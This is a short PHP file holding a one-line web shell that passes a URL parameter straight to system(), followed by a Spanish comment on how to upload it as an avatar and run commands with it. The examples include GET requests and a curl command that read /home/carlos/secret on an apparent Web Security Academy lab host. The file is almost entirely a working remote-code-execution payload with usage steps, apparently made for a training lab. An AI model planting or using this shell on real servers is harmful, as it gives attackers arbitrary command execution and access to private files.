<?php system($_GET['command']); ?>
<?php /*
Web shell RCE (salida LIMPIA: system() ya imprime la salida, sin echo no se duplica).
Subir como .php y ejecutar comandos por el parametro ?command= :

    GET /files/avatars/example_best.php?command=cat%20/home/carlos/secret
    GET /files/avatars/example_best.php?command=id

Objetivo tipico del lab:  leer  /home/carlos/secret .
Con curl:
    curl 'https://LAB-ID.web-security-academy.net/files/avatars/example_best.php?command=cat%20/home/carlos/secret'
*/ ?>
